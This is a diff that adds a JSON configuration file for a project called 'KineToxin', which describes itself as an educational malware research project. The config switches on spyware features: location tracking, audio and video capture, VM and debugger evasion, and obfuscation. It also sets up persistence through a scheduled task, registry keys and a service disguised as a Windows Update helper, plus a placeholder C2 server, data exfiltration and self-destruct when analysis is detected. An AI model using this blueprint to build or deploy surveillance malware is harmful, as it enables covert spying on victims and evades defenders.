@@ -1,0 +1,101 @@
+{
+  "project": {
+    "name": "KineToxin",
+    "version": "1.0.0",
+    "author": "Hassan Odowa",
+    "description": "Educational Malware Research Project"
+  },
+  "surveillance": {
+    "location": {
+      "enabled": true,
+      "update_interval_ms": 30000,
+      "accuracy_threshold": 100.0,
+      "max_history_entries": 1000
+    },
+    "audio": {
+      "enabled": true,
+      "quality": "medium",
+      "max_recording_minutes": 60,
+      "format": "wav"
+    },
+    "video": {
+      "enabled": true,
+      "resolution": "720p",
+      "fps": 15,
+      "max_recording_minutes": 30,
+      "format": "mp4"
+    }
+  },
+  "evasion": {
+    "vm_detection": {
+      "enabled": true,
+      "strict_mode": false,
+      "exit_on_detection": true
+    },
+    "anti_debug": {
+      "enabled": true,
+      "multiple_checks": true,
+      "exit_on_detection": true
+    },
+    "obfuscation": {
+      "enabled": true,
+      "string_encryption": true,
+      "control_flow": true
+    }
+  },
+  "persistence": {
+    "registry": {
+      "enabled": true,
+      "startup_key": true,
+      "backup_locations": 3
+    },
+    "service": {
+      "enabled": false,
+      "service_name": "WindowsUpdateService",
+      "display_name": "Windows Update Service Helper"
+    },
+    "scheduled_task": {
+      "enabled": true,
+      "task_name": "SystemMaintenance",
+      "trigger": "daily"
+    }
+  },
+  "communication": {
+    "c2_servers": [
+      {
+        "url": "https://example.com/api",
+        "backup": true,
+        "encryption": "aes256"
+      }
+    ],
+    "encryption": {
+      "algorithm": "aes256",
+      "key_exchange": "rsa2048",
+      "compression": true
+    },
+    "exfiltration": {
+      "max_file_size_mb": 10,
+      "compression": true,
+      "encryption": true,
+      "steganography": false
+    }
+  },
+  "logging": {
+    "level": "error",
+    "max_file_size_mb": 5,
+    "encrypt_logs": true,
+    "remote_logging": false
+  },
+  "security": {
+    "self_destruct": {
+      "enabled": true,
+      "conditions": ["analysis_detected", "command_received"],
+      "secure_delete": true
+    },
+    "integrity_check": {
+      "enabled": true,
+      "hash_verification": true,
+      "anti_tampering": true
+    }
+  }
+}
